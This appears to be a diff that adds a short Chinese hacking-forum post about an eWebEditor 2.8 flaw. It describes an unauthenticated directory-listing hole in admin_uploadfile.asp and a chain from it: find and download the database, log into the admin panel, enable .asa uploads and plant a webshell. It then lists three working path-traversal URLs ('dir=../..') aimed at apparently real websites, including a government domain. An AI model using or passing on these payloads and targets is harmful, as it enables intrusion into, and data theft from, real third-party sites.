@@ -1,0 +1,11 @@
+ewebeditor 2.8 XdayPS：这个版本的编辑器很多，我敢说，我遇到的很多都是这种的，一直没找到什么利用的洞子，得到这个
+
+洞子，也不容易呀。都是大牛好不容易才放出来的！ 个人意见，不要喷我!
+
+
+由于某些修正版本对admin_uploadfile.asp文件的session没过滤好.所以造成不需要验证直接列目录，然后跟在URL中输入，查找到数据库路径 然后下载，进后台设置ASA 上传得到WEBSHELL11
+
+demo:引用:
+http://www.eastlaborlaw.com/admin_dbh/ewebEditor_liangcai/admin_uploadfile.asp?id=&dir=../.. 
+http://www.czmilan.com/xmlEditor/ewebeditor/admin_uploadfile.asp?id=&dir=../..引用:
+http://wujia.huizhou.gov.cn/xdocweb/webeditor/admin_uploadfile.asp?id=&dir=../..
